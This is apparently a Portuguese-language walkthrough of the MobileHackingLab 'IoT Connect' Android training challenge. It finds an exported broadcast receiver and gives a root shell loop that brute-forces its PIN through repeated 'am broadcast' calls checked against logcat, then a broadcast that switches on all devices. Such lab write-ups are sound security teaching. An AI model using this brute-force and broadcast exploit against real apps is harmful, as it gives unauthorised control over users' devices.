# IOT Connect - Android Broadcast Receiver Challenge

Ao analisár o AndoidManifest.xml é possivel verificar que o Recever a baixo está setado como exported="true", referente à action MASTER_ON revela uma superfície de ataque potencial.

<receiver android:name="com.mobilehackinglab.iotconnect.MasterReceiver" android:enabled="true" android:exported="true">

![image](https://github.com/user-attachments/assets/91069519-9230-4088-a86f-063124f71794)



![image](https://github.com/user-attachments/assets/042662a1-0d2c-4356-8c3b-635d10ff04e0)


![image](https://github.com/user-attachments/assets/c960ba7d-9bbf-4d0a-abcf-af2eaaa8aff3)


![image](https://github.com/user-attachments/assets/bad7fb75-8ef9-4632-8899-0e803e5053f3)


É necessario acesso de root para poder ter permissão no logcat

emulator64_x86_64_arm64:/ $ su 

Podemos fazer um brute force no PIN e verificar se os dispositivos foram ligados com logcat.

emulator64_x86_64_arm64:/ #  for i in $(seq 0 9999); do logcat -c && am broadcast -a MASTER_ON --ei key $i > /dev/null && sleep 0.3 && logcat -d | grep -q "Turning all devices on" && echo "[+] PIN FOUND: $i" && break; done

Depois de identificar o PIN é so utilizar enviando um broadcast para ligar os dispositivos.

emulator64_x86_64_arm64:/ #  am broadcast -a MASTER_ON --ei key 345


![image](https://github.com/user-attachments/assets/3a1c0790-1fd4-4939-bb5a-39c7a83f0c5e)


![image](https://github.com/user-attachments/assets/ea8cc476-dbf8-418b-94d8-f795d2f4ea54)



![image](https://github.com/user-attachments/assets/dd080c64-bbb9-44e5-bdb0-0b4ae4eb6b44)


![image](https://github.com/user-attachments/assets/8fe18404-7f2a-4300-ae82-d063f3554c5c)


![image](https://github.com/user-attachments/assets/6279bf9d-fcf9-43b0-ae5e-327926a39b73)


am broadcast -a MASTER_ON --ei key 345

![image](https://github.com/user-attachments/assets/23e00328-d698-4c3e-87d5-3d646a57fb03)

https://riptutorial.com/android/example/10642/sending-broadcast


https://www.mobilehackinglab.com/path-player?courseid=lab-iot-connect
